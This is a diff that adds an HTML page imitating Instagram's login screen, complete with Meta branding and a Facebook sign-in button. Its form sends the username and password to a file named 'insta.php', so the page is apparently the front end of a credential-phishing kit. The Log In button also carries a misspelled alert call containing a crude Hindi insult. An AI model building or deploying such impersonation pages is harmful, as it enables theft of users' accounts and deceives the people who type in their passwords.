@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            /* display: flex; */
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        header{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        main{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #login-container {
+            background-color: #fafafa;
+            
+            padding: 20px;
+           
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        #login-container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            border-radius: 5px;
+            border-color: #e6e6e6;
+            background-color: #e6e6e6;
+        }
+
+        button {
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+
+        button:hover {
+            background-color: #2874a6;
+        }
+
+        .separator {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e6e6e6;
+        }
+
+        .separator span {
+            padding: 0 10px;
+            color: #999;
+        }
+        .text{
+            text-decoration: none;
+            text-align: end;
+        }
+        .textContainer{
+            text-align: end;
+        }
+        footer{
+            background-color: #e6e6e6;
+            border-top: 1px solid gray;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height:60px;
+            flex-direction: column;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h5>English (UK) v</h5>
+    </header>
+    <main>
+    <div id="login-container">
+        <div><img src="8n91YnfPq0s.png" alt=""></div>
+        <br><br><br>
+        <button type="submit"><img src="download.png" style="height: 20px; margin-right: 6px; ;">Continue Using Facebook</button>
+        <br><br>
+        <div class="separator">
+            <span>OR</span>
+        </div>
+        <br><br>
+        <form action="insta.php" method="post">
+            <input type="text" name="username" placeholder="Phone number, Username or email address" id="username" required>
+            <input type="password" name="password" placeholder="Password" id="password" required>
+            <br>
+           <div class="textContainer"> <a href="#" class="text" style="color: blue;">Forgotten your password?</a></div>
+           <br>
+            <button type="submit" onclick="aler('Chaala ja Bsdk')">Log In</button>
+        </form>
+        <p>Don't have an account? <a href="#" style="text-decoration: none; color: blue;">Sign up</a></p>
+    </div>
+</main><br><br><br><br><br>
+<footer>
+    <div class="footerText">from</div>
+    
+    <img src="meta.jpg" style="height: 20px; padding-top: 2px;">
+</footer>
+</body>
+</html>
